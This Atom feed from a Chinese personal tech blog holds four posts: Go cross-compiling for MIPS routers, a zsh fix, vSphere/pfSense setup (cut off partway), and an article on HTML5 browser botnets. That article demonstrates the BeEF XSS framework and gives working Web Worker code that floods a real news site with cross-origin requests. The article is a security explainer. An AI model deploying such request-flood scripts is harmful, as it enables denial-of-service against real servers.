<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zebork&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-02-08T08:39:15.887Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zebork</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Golang mips32le(mipsel/ramips) 交叉编译</title>
    <link href="http://yoursite.com/2018/02/07/2018/Golang_mips32le/"/>
    <id>http://yoursite.com/2018/02/07/2018/Golang_mips32le/</id>
    <published>2018-02-07T07:24:02.000Z</published>
    <updated>2018-02-08T08:39:15.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-缘起"><a href="#0x01-缘起" class="headerlink" title="0x01 缘起"></a>0x01 缘起</h1><p>要在斐讯K1/K2上写一些代码操纵流量走向，操作逻辑也比较复杂，为了性能本人一开始是用C的，直接在openwrt官网上就可以下载到全套的SDK，包括GCC，G++等等。然而写了两天，已经泡在bug的海洋里了，还是菜。</p>
<p>为了赶上deadline，不得不换Golang。然而Golang的官方版本是没有针对mipsel架构的，但是Google一下发现Gitbub上存在一个单独的Go项目可以针对mipsel进行交叉编译。</p>
<p>tip：据说Golang的速度仅次于C++，本人没有实际测过。</p>
<h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><p>本次配置要感谢Go语言中文网jacle169的<a href="https://studygolang.com/articles/7326" target="_blank" rel="external">这篇文章</a></p>
<p>为了赶deadline，很多坑都没有细看怎么回事，直接跳过了。比如：</p>
<ol>
<li><p>需要用Ubuntu，我用的是<code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</code>，第一次尝试用Kali Linux，同样的架构，但是出现了编译不通过的问题</p>
</li>
<li><p>环境变量的配置也比较恶心，按照上述文章的配置，编译看似通过，但是会有一个隐藏的error输出在一堆正常输出中间，不仔细看就略过了。产生的问题就是编译后的bin目录下只有一个gofmt可执行程序，而没有go程序。因此，环境变量的配置如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> GOOS=linux </div><div class="line"><span class="built_in">export</span> GOARCH=mips32le</div><div class="line"><span class="built_in">export</span> CGO_ENABLED=0</div></pre></td></tr></table></figure>
<p>重要的是最后一行，应该是嵌入C语言的配置。</p>
</li>
</ol>
<h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><p>直接摘抄jacle169的过程，但是填了我遇到坑。我配置时候的过程也差不多，除了GO项目放置的位置不一样。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//下载go-mips32源 </div><div class="line">git <span class="built_in">clone</span> https://github.com/gomini/go-mips32.git </div><div class="line"><span class="built_in">cd</span> go-mips32/src</div><div class="line">//配置GO编译参数 </div><div class="line"><span class="built_in">export</span> GOOS=linux </div><div class="line"><span class="built_in">export</span> GOARCH=mips32le &lt;== Change to mips32 <span class="keyword">if</span> mips</div><div class="line"><span class="built_in">export</span> CGO_ENABLED=0</div><div class="line">//执行编译</div><div class="line">./make.bash </div><div class="line"><span class="built_in">cd</span> ..</div><div class="line">//创建编译后文件存放文件夹 </div><div class="line">sudo mkdir /opt/mipsgo</div><div class="line">//复制 </div><div class="line">sudo cp -R * /opt/mipsgo</div><div class="line">//go工程参数配置 </div><div class="line"><span class="built_in">export</span> GOROOT=/opt/mipsgo </div><div class="line"><span class="built_in">export</span> PATH=/opt/mipsgo/bin:<span class="variable">$PATH</span></div><div class="line">3.编译go程序作为测试</div><div class="line">mkdir /opt/slu</div><div class="line"><span class="built_in">cd</span> /opt/slu</div><div class="line">vim main.go</div></pre></td></tr></table></figure>
<p>main.go — helloworld源码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">       fmt.Println(<span class="string">"hello icoolpy.com"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其实配置GO编译参数的三行export可以在终端显式运行，也就是在进行源码编译时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GOOS=linux GOARCH=mips32le CGO_ENABLED=0 ./make.bash</div></pre></td></tr></table></figure>
<p>#0x04 测试</p>
<p><img src="/img/2018/02/go-mips32-test.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-缘起&quot;&gt;&lt;a href=&quot;#0x01-缘起&quot; class=&quot;headerlink&quot; title=&quot;0x01 缘起&quot;&gt;&lt;/a&gt;0x01 缘起&lt;/h1&gt;&lt;p&gt;要在斐讯K1/K2上写一些代码操纵流量走向，操作逻辑也比较复杂，为了性能本人一开始是用C的，直接在o
    
    </summary>
    
      <category term="Programing" scheme="http://yoursite.com/categories/Programing/"/>
    
    
      <category term="Golang" scheme="http://yoursite.com/tags/Golang/"/>
    
      <category term="mips" scheme="http://yoursite.com/tags/mips/"/>
    
      <category term="mips32le" scheme="http://yoursite.com/tags/mips32le/"/>
    
      <category term="ramips" scheme="http://yoursite.com/tags/ramips/"/>
    
  </entry>
  
  <entry>
    <title>zsh的坑</title>
    <link href="http://yoursite.com/2017/09/06/2017/zsh_no_match_found-09-06/"/>
    <id>http://yoursite.com/2017/09/06/2017/zsh_no_match_found-09-06/</id>
    <published>2017-09-05T16:24:02.000Z</published>
    <updated>2017-09-05T16:51:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="深夜发牢骚"><a href="#深夜发牢骚" class="headerlink" title="深夜发牢骚"></a>深夜发牢骚</h2><p><img src="/img/2017/09/zsh/1.png" alt=""></p>
<p>还是因为对自己不自信吧，以为自己敲的命令是错的。</p>
<p>事件的起因是ipv6。我经常用scp，ssh，但是scp的时候ipv6的地址会报错，一看是因为冒号太多了，识别不了，可以理解。然后google了一下解决办法是加方括号把ipv6地址括起来，试了一下，还是报错<code>no matches found</code>，当时我的内心是这样的：卧槽，scp连ipv6地址都不支持还搞毛线。</p>
<p>今天又试了一下（确切说是昨天），不是scp的命令了。</p>
<p>想用ssh本地端口转发，又不行了。这回完全是刚才的图了。</p>
<p>想想自己也是很蠢的，都没有把这个错误关键字Google一下，刚才一查直接就查到了是zsh的问题。</p>
<p>终端要炫酷，肯定要用zsh的嘛。。。不过居然是zsh不兼容的问题，我也是服。</p>
<p>换成bash来执行就完全没问题了。</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>在~/.zshrc文件中加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setopt nonomatch</div></pre></td></tr></table></figure>
<p>然后命令行输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">source ~/.zshrc</div></pre></td></tr></table></figure>
<p>就没问题了。</p>
<p>初步看了一下问题，主要是zsh会自动解析命令中的东西，我还不知道这有啥用，可能在某些我不知道的方面是有用的吧。</p>
<p>实在是个坑（当我知道是zsh的问题的时候的心情无法用语言来形容）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;深夜发牢骚&quot;&gt;&lt;a href=&quot;#深夜发牢骚&quot; class=&quot;headerlink&quot; title=&quot;深夜发牢骚&quot;&gt;&lt;/a&gt;深夜发牢骚&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/2017/09/zsh/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;还是因为对自己不自
    
    </summary>
    
      <category term="微型blog" scheme="http://yoursite.com/categories/%E5%BE%AE%E5%9E%8Bblog/"/>
    
    
      <category term="zsh" scheme="http://yoursite.com/tags/zsh/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Web前端僵尸网络</title>
    <link href="http://yoursite.com/2017/09/01/2016/%E6%B5%85%E8%B0%88Web%E5%89%8D%E7%AB%AF%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2017/09/01/2016/浅谈Web前端僵尸网络/</id>
    <published>2017-09-01T05:34:20.000Z</published>
    <updated>2017-09-01T05:34:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>转载自<a href="http://www.freebuf.com/articles/network/120749.html" target="_blank" rel="external">Freebuf</a>，虽然原作者就是我。。</p>
</blockquote>
<h1 id="Web前端僵尸网络的基本原理"><a href="#Web前端僵尸网络的基本原理" class="headerlink" title="Web前端僵尸网络的基本原理"></a>Web前端僵尸网络的基本原理</h1><p>僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑站。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新型僵尸网络。</p>
<p>除此之外，本文将介绍一种<a href="">基于Web前端的僵尸网络</a>。在新的HTML5标准越来越广泛地被使用之后，HTML5的强大功能为构建僵尸网络提供了可能性。由于这种僵尸网络基于支持HTML5的Web前端浏览器，所以其权限很低。不过，基于Web前端的僵尸网络至少可以用作DDOS攻击，如果处理得当，也可以用作对HTTP服务器进行扫描等操作。</p>
<p>下面是本文总结的Web前端僵尸网络的技术基础：</p>
<p>1、HTML5 新增技术——Web Worker技术。这是一种多线程机制，使得浏览器可以在不影响用户操作的同时处理其他事务，这为恶意的JS脚本提供了异步环境；</p>
<p>2、HTML5 新增机制——跨域资源共享机制（CORS）。CORS处理机制工作在浏览器层面，如果服务器不允许跨站，浏览器将拦截服务器返回的结果。也就是说即使是跨域请求，服务器也同样会处理，并正常返回请求的资源。这个技术本身其实不对僵尸网络构成支持，但是HTML5支持CORS机制之后并未禁止跨域发送请求，这就成了前端僵尸网络立足的关键；</p>
<p>3、Web蠕虫。类似于传统的蠕虫病毒，Web蠕虫使前端僵尸网络可以自行传播，结合Web蠕虫，前端僵尸网络可以相对容易地形成规模。</p>
<p>以上三个技术点，合成在一起，为僵尸网络的存在提供了基本条件。下面进行详细介绍。</p>
<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>Web Worker 是运行在后台的 Javascript，独立于其他脚本，不会影响页面的性能。下面简单列举一下Web Worker能够做什么。</p>
<ol>
<li><p>可以加载一个JS进行大量的复杂计算而不挂起主进程，用户可以在Worker运行期间做点击、选取内容等等任何事情；</p>
</li>
<li><p>可以通过postMessage，onmessage方法进行线程通信；</p>
</li>
<li><p>可以在Worker中通过importScripts(url)加载另外的脚本文件；</p>
</li>
<li><p>可以使用 setTimeout，clearTimeout，setInterval，clearInterval等方法；</p>
</li>
<li><p>可以使用XMLHttpRequest来发送请求，以及访问navigator的部分属性。</p>
</li>
</ol>
<p>Web Worker增强了浏览器的能力。功能强大了，危险性也随之增大了。</p>
<h2 id="CORS跨域资源共享机制"><a href="#CORS跨域资源共享机制" class="headerlink" title="CORS跨域资源共享机制"></a>CORS跨域资源共享机制</h2><p>跨域HTTP请求(Cross-site HTTP request)是一类相对特殊的浏览器请求，这种请求不是浏览器向在本页面为它提供资源的域名发起的，而是浏览器向其他的域名发起的。CORS机制可以让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
<p>很多文章和资料对CORS机制内部工作原理解释的不够清楚，导致本人一度以为CORS是在跨域请求发出时拦截或者在服务器层次禁止了资源的返回。然而实际上CORS安全机制并没有针对服务器提供任何保护。</p>
<p>本文只针对XMLHttpRequest总结以下几点：</p>
<ol>
<li><p>XMLHttpRequest请求可以发送到跨域服务器；</p>
</li>
<li><p>跨域服务器会对之前的XMLHttpRequest做出响应；</p>
</li>
<li><p>跨域服务器对XMLHttpRequest的响应和正常访问这个服务器产生的响应没有任何区别；</p>
</li>
<li><p>未能加载服务器资源的原因是浏览器对跨域资源做出了拦截限制。</p>
</li>
</ol>
<p>因此，对于服务器来说，假设有10000个XMLHttpRequest同时对某资源发出请求，以上的请求与10000个用户同时用浏览器正常访问这个资源是等价的，因为都要做同样的处理，都要返回同样的内容。这也就是说，使用Web Worker和XMLHttpRequest进行DDOS攻击是可行的。</p>
<h2 id="Web蠕虫"><a href="#Web蠕虫" class="headerlink" title="Web蠕虫"></a>Web蠕虫</h2><p>Web蠕虫是Web前端僵尸自行传播的方法。这种机制利用的是传统前端漏洞，例如XSS漏洞。</p>
<p><img src="/img/2016/clip_image001.png" alt="img"></p>
<p>本文没有尝试实现僵尸节点（Web前端）和控制端的交互，这需要更复杂的JS代码，顺便提一下已经实现此类功能的BeEF XSS框架。</p>
<p>这个框架很流行，集成了很多功能，甚至能够结合MSF使用。但是这些不在本文的探究范围之内。本文只对这个框架控制端和僵尸节点的交互进行演示。</p>
<p>Kali Linux系统中集成了这个工具，本文用Kali Linux虚拟机进行演示。</p>
<p>打开BeEF框架之后如图所示，不要关闭这个终端，等待程序加载完成后，一般情况下浏览器会弹出，如果没有弹出，打开浏览器手动输入终端中显示的UI URL。 </p>
<p><img src="/img/2016/clip_image003.png" alt="img"></p>
<p>默认的用户名和密码都是beef。登录成功后的页面如下：</p>
<p><img src="/img/2016/clip_image005.png" alt="img"></p>
<p>首页上有一些被植入恶意Javascript的Demo。为了演示的方便，使用实体机的Safari浏览器进行访问，将会在左侧显示信息。接下来按照下图点击到如下页面。</p>
<p><img src="/img/2016/clip_image007.png" alt="img"></p>
<p>点击红色圆圈中的Execute之后，将会在用户浏览器执行上面方框中输入的Javascript代码，给用户的浏览器弹出一个对话框，下图是实体机的Safari浏览器中的效果：</p>
<p><img src="/img/2016/clip_image009.png" alt="img"></p>
<p>通过这种方式，就可以在用户的浏览器中执行控制端需要僵尸节点执行的代码。有兴趣的朋友可以去读一下BeEF框架中hook.js文件源代码，应该会有很多启发。</p>
<h1 id="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"><a href="#僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）" class="headerlink" title="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"></a>僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）</h1><p>测试的思路是：植入恶意Javascript代码，批量对某网站发送100次XMLHttpRequest，此次尝试的对象是腾讯的网站，因为单个节点的100次请求肯定对腾讯服务器无影响。攻击url为：<a href="http://news.qq.com/photo.shtml" target="_blank" rel="external">http://news.qq.com/photo.shtml</a>，用户访问的url为：<a href="http://localhost/botnet/index.html" target="_blank" rel="external">http://localhost/botnet/index.html</a>，测试代码见附录。</p>
<p>通过Wireshark和chrome浏览器network开发者工具对测试结果进行分析：</p>
<p>Wireshark抓到的tcp流：</p>
<p><img src="/img/2016/clip_image011.png" alt="img"></p>
<p>详细查看Response：</p>
<p><img src="/img/2016/clip_image013.png" alt="img"></p>
<p>Chrome：</p>
<p><img src="/img/2016/clip_image015.png" alt="img"></p>
<p><img src="/img/2016/clip_image017.png" alt="img"></p>
<p>可以看到，Wireshark抓到了Response是有资源数据的，但是Chrome中得到的只有服务器返回的状态信息，这是CORS机制在浏览器层次对于跨域资源做了限制。</p>
<p>但是，Wireshark抓包得到的数据可以证明服务器实实在在地对每个请求都做出了正常的响应。当这样的僵尸节点数目和Web Worker并发数目都增大到一定的等级，理论上就可以形成强大的DDOS攻击了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>HTML5时代的Web前端已经不再那么简单。支持HTML5的浏览器，给了僵尸网络足够的生存空间。</p>
<h1 id="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"><a href="#附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）" class="headerlink" title="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"></a>附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）</h1><h2 id="run-worker-js"><a href="#run-worker-js" class="headerlink" title="run_worker.js:"></a>run_worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">var worker_loc= &apos;worker.js&apos;;</div><div class="line">var workers = new Array();</div><div class="line">var i = 0;</div><div class="line">var noWorker = typeof Worker ==&quot;undefined&quot; ? true : false;</div><div class="line">var target = &apos;http://news.qq.com/photo.shtml&apos;</div><div class="line">if (!noWorker) &#123;</div><div class="line">    try &#123;</div><div class="line">        for(i = 0; i &lt; 1; i++) &#123;</div><div class="line">           workers[i] = new Worker(worker_loc);</div><div class="line">           workers[i].postMessage(target);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    catch(e) &#123;</div><div class="line">       //comment out in release</div><div class="line">        e =e + &quot;&quot;;</div><div class="line">        if(e.indexOf(&quot;Worker is not enabled&quot;) != -1) &#123;</div><div class="line">           noWorker = true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>​       当浏览器支持Web Worker的时候，就会根据代码循环建立Worker。利用new worker(worker_loc)方式，创建Worker对象，并利用Worker的postMessage方法向worker发送指令等数据。多个Worker可以实现并发。但是本例只建立了一个Worker。</p>
<h2 id="worker-js"><a href="#worker-js" class="headerlink" title="worker.js:"></a>worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">function makeRequest(base) &#123;</div><div class="line">    varfullUrl = base</div><div class="line">    varhttpRequest = new XMLHttpRequest();</div><div class="line">   httpRequest.open(&quot;GET&quot;, fullUrl, true);</div><div class="line">   httpRequest.send(null);</div><div class="line">&#125;</div><div class="line">function dos(base) &#123;</div><div class="line">    var i =0;</div><div class="line">    for (i= 0; i &lt; 100; i++) &#123;</div><div class="line">       console.log(base);</div><div class="line">       makeRequest(base);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">self.onmessage = function (e) &#123;</div><div class="line">    base =e.data;</div><div class="line">   dos(base);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Web Worker可以使用XMLHttpRequest发送跨域请求。这个函数可以使用GET和POST两种方法，一般使用GET方法就可以了，但是POST方法不限制发送长度和字符，有些情况必须要用POST方法。本例中采用GET方法测试。</p>
<h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html:"></a>index.html:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">    #page&#123;width: 100%; height: 100%;&#125;</div><div class="line">   body&#123;margin:0&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">    varworker_loc = &apos;worker.js&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;run_worker.js&quot;&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;iframe id=&quot;page&quot;name=&quot;page&quot; src=&quot;http://www.example.com&quot; frameborder=</div><div class="line">&quot;0&quot;noresize=&quot;noresize&quot;style=&quot;overflow:visible&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>index.html几乎没有更改，因为这个网页的内容对恶意javascript的测试没有影响。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>其实在这里写一遍就想补充一下。</p>
<p>的确，利用XSS蠕虫弄一个门户网站估计费劲不说也会马上被修复，但是，仔细想想，好像有不用XSS就产生了很大效果的事件吧。</p>
<p>补充到此结束。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转载自&lt;a href=&quot;http://www.freebuf.com/articles/network/120749.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Freebuf&lt;/a&gt;，虽然原作者就是我。。&lt;/p&gt;
&lt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web前端" scheme="http://yoursite.com/tags/Web%E5%89%8D%E7%AB%AF/"/>
    
      <category term="僵尸网络" scheme="http://yoursite.com/tags/%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>vSphere + pfSense 虚拟化服务器</title>
    <link href="http://yoursite.com/2017/08/31/2017/vsphere_pfsense_2017-08-31/"/>
    <id>http://yoursite.com/2017/08/31/2017/vsphere_pfsense_2017-08-31/</id>
    <published>2017-08-31T15:04:02.000Z</published>
    <updated>2017-09-01T05:13:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vSphere-ESXi"><a href="#vSphere-ESXi" class="headerlink" title="vSphere ESXi"></a>vSphere ESXi</h2><p><a href="https://www.vmware.com/products/esxi-and-esx.html" target="_blank" rel="external">vSphere ESXi</a>是VMware公司的服务器系统，老版本的vSphere ESX是基于Red Hat Linux的服务器控制平台，而新版本的ESXi直接在VMkernel上运行，一个vSphere ESXi 6.0.0系统的镜像大小缩小为375MB左右。</p>
<p>为服务器安装vSphere ESXi系统时可以采用平时装机常用烧USB的方式，不过前提是对服务器比较熟悉，如果是新服务器还需要配置虚拟存储器，如果插了很多块硬盘可能会有分区等操作。</p>
<p>另外，U盘启动之前，启动模式要调成EFI模式，不能用BIOS模式，否则会出现坑，坑长这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Loading /tboot.b00</div><div class="line">Loading /b.b00</div><div class="line">Loading /useropts.gz</div><div class="line">Loading /k.b00</div><div class="line">Loading /a.b00</div><div class="line">Loading /ata-pata.v00</div><div class="line">Loading /ata-pata.v01</div><div class="line">Loading /ata-pata.v02</div><div class="line">Loading /ata-pata.v03</div><div class="line">Loading /ata-pata.v04</div><div class="line">Loading /ata-pata.v05</div><div class="line">Error loading /ata-pata.v05</div><div class="line">Fatal error: 6 (Buffer too small)</div></pre></td></tr></table></figure>
<p>坑跳过去基本就没事了。</p>
<p><img src="/img/2017/08/vsphere/11.jpg" alt=""></p>
<p>如果是接到家里路由器上的话，给服务器配个静态IP地址，然后用客户端连接就可以了。客户端和服务器之间通过https进行通信，不过ESXi的一个非常坑爹的特点是不支持NAT，只有类似于我们在VMware Workstation里边的桥接模式，但是很多时候我们有这方面的需求。</p>
<p>当然了，如果是在家连个路由器用的话，大可不必折腾后边的pfSense软路由了。虚拟机网络直接桥接，无非是路由器多分配几个IP地址而已。</p>
<h2 id="pfSense软路由"><a href="#pfSense软路由" class="headerlink" title="pfSense软路由"></a>pfSense软路由</h2><p>本次实验环境搭建的情景是这样的：一台服务器有N个虚拟机需要联网，但是IP地址只有两个。</p>
<p>其实也可以只有一个IP地址，将pfSense作为路由器，这样的方式一般在自己家里和学校的实验室比较常见，只有一个PPPOE账号，也就只有一个IP地址，或者教育网内的网口，不允许申请多个IP的那种。个人觉得这种方式的重量级，虽然比起买个小型路由器大了很多，但是在N人共用一个路由器，需要很大NAT转发能力的情况下，用服务器取代小型家用路由器，也是一个不错的选择（经费足够的情况下）。毕竟服务器的运算速度和内存是嵌入式设备不能比的。</p>
<p>不过一个IP地址，在刚才的情况系可能还是需要外接一个WIFI无线网卡（否则网线不够插的啊）。</p>
<p>其他的情景应该也有很多吧，比如作为大一点的网关什么的，我猜的。。</p>
<p>没试过只有一个IP地址的，就不多说了，两个IP地址就好整多了，假设只有两个ip地址<code>10.10.10.10</code>和<code>10.10.10.11</code>，配置好后大概的结构是这样的：</p>
<p>服务器IP地址 ：<code>10.10.10.10</code></p>
<p>pfSense WAN:  <code>10.10.10.11</code></p>
<p>pfSense LAN : <code>192.168.1.1</code></p>
<p><a href="https://www.pfsense.org/" target="_blank" rel="external">pfSense</a>是一款基于FreeBSD做的操作系统，可以安装在物理机或者虚拟机上，提供Web界面进行配置，用处广泛，可以给防火墙，路由器以及VPN路由等使用。</p>
<p><img src="/img/2017/08/vsphere/2.png" alt=""></p>
<p>这次实验是将pfSense安装在虚拟机里，所以才叫做“软路由”。</p>
<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>前边给服务器安装vSphere ESXi的过程就不写了。</p>
<p>ESXi系统搭建好，并配好IP地址<code>10.10.10.10</code>。另外需要一台能访问这个ip地址的电脑，暂时将这台电脑的IP地址算做是<code>10.10.10.9</code>好了，这个不影响，只要能访问到就行。</p>
<p>可以从pfSense官网下载ISO镜像安装pfSense系统，也可以使用OVF模板。我采用OVM模板弄的，这个中文全称是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6" target="_blank" rel="external">开放虚拟机格式文件</a>。比起ISO还是方便很多。一路下一步就可以建立好一个pfSense虚拟机，但是不要开启。</p>
<p><img src="/img/2017/08/vsphere/4.png" alt=""></p>
<p>另外如果想配置好这个软路由，最好在服务器上新建一个Windows虚拟机（其实也可以是带图形的Linux，比如Ubuntu，不过我不喜欢给自己找麻烦）。建立虚拟机之前需要将ISO文件上传到服务器上，可以如下图，直接访问存储器，然后上载文件（还是上传文件这个翻译顺口一点）。</p>
<p><img src="/img/2017/08/vsphere/22.jpg" alt=""></p>
<p><img src="/img/2017/08/vsphere/5.png" alt=""></p>
<p>建立虚拟机的过程比较容易，无非就是选择一下系统版本，CPU核心数，内存大小之类的，有一个小坑提一下：</p>
<p><img src="/img/2017/08/vsphere/6.png" alt=""></p>
<p>上图打开电源时连接，在开启虚拟机之前一定要勾上，否则会提示没有操作系统，虽然是个很蠢的坑，但是一不小心还真容易犯错，另外上图是我已经完成所有配置后的图，包括网络配置，除了标红的地方剩下的如果有什么不一样可以忽略。</p>
<p>Ok，现在已经有了一台装好ESXi系统的服务器，并且有了两个IP地址，ESXi分配了<code>10.10.10.10</code>，而且添加了一台虚拟机，虽然目前这个虚拟机是无法上网的（除非独吞掉<code>10.10.10.11</code>这个IP地址）</p>
<h3 id="添加网络"><a href="#添加网络" class="headerlink" title="添加网络"></a>添加网络</h3><p><img src="/img/2017/08/vsphere/33.jpg" alt=""></p>
<p>第一部，选择添加虚拟机网络：</p>
<p><img src="/img/2017/08/vsphere/44.jpg" alt=""></p>
<p>然后断开所有适配器的链接</p>
<p><img src="/img/2017/08/vsphere/7.png" alt=""></p>
<p>改个名字，NAT Network</p>
<p><img src="/img/2017/08/vsphere/8.png" alt=""></p>
<h3 id="pfSense命令行配置"><a href="#pfSense命令行配置" class="headerlink" title="pfSense命令行配置"></a>pfSense命令行配置</h3><p>刚才用OVF模板建立好的pfSense虚拟机，网络适配器需要改成这样的</p>
<p><img src="/img/2017/08/vsphere/9.png" alt=""></p>
<p>开机的欢迎界面还是可以的</p>
